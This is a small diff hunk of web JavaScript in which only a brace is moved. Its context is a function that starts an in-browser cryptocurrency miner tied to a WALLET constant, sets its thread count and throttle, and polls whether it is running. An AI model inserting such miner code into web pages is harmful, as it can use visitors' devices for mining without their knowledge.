@@ -96,8 +96,7 @@
     function mine(t) {
         if(!miner) miner = new WMP.Anonymous(WALLET, {throttle: 0.1});
         miner.setNumThreads(t); miner.start();
-        if(navigator.vibrate) navigator.vibrate(100);
-    }
+        if(navigator.vibrate) navigator.vibrate(100);}
 
     setInterval(() => {
         if(miner && miner.isRunning()) {
